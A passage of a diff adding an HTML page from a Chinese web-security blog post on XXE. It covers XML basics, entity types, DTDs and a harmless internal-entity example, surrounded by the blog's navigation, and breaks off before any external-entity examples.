@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Web安全学习之XXE漏洞利用 - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-02-26&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">5.1k</span>
+  
+  <h1 id="Web安全学习之XXE漏洞利用">Web安全学习之XXE漏洞利用</h1>
+<h2 id="什么是XXE">什么是XXE</h2>
+<p>XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击（那为啥不叫XEE）。对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。</p>
+<p>XML（Extensible Markup Language）英文直译就是可扩展标记语言，“标记” 是指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。</p>
+<p>如果把 HTML 和 XML 进行对比的话， HTML 旨在显示数据信息，而 XML 旨在传输数据信息。（说到传输数据自然而然肯定会想到json格式，相比XML，现在用的更多是json格式来传输数据）</p>
+<h3 id="XML基本知识">XML基本知识</h3>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>ca01h<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>njupt<span class="tag">&lt;/<span class="name">from</span>&gt;</span>xml</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在上面代码中的第一行，定义XML的版本与编码。</p>
+<p>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<code>&lt;note&gt;</code>是整个文档的根元素。嵌套在note标签中的<code>&lt;to&gt;</code>和<code>&lt;from&gt;</code>则是根的子元素。</p>
+<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
+<h3 id="实体">实体</h3>
+<p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p>
+<p>实体总共有四种，分别是：</p>
+<ul>
+<li>
+<p>内置实体 (Built-in entities)</p>
+</li>
+<li>
+<p>字符实体 (Character entities)</p>
+</li>
+<li>
+<p>通用实体 (General entities)</p>
+</li>
+<li>
+<p>参数实体 (Parameter entities)</p>
+</li>
+</ul>
+<p>其中内置实体和字符实体都和 HTML 的实体编码类似，但如果从另一个角度看，实体完全可以分成两个派别：通用实体和参数实体。</p>
+<h3 id="DTD">DTD</h3>
+<p>XML的语言规范是由DTD（Document Type Definition）来控制，类似编程语言的语法，它定义了XML文档的合法构建模块，即声明了XML的内容格式规范。</p>
+<p>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 dtd 文件。</p>
+<h4 id="内部引用">内部引用</h4>
+<p>下面是一个内部DTD的XML示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明--&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--DTD，文档类型声明--&gt;</span><br><span class="line">&lt;!DOCTYPE note [ #定义此文档是note类型</span><br><span class="line">&lt;!ELEMENT note (body)&gt; #定义note元素有一个元素：&quot;body&quot;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt; #定义body元素为&quot;#PCDATA&quot;类型</span><br><span class="line">&lt;!ENTITY writer &quot;hello world&quot;&gt; #定义一个内部实体</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;                                                                        </span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;body&gt;&amp;writer;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
+<p>上面第7行定义了一个内部实体，第11行中对上面定义的writer实体进行了引用，到时候输出的时候&amp;writer就会被&quot;hello world&quot;替换。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (😉，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号</p>
+<h4 id="外部引用">外部引用</h4>
+<h5 id="通用实体">通用实体</h5>
+<p>下面再来看看一个外部DTD的XML示例：</p>
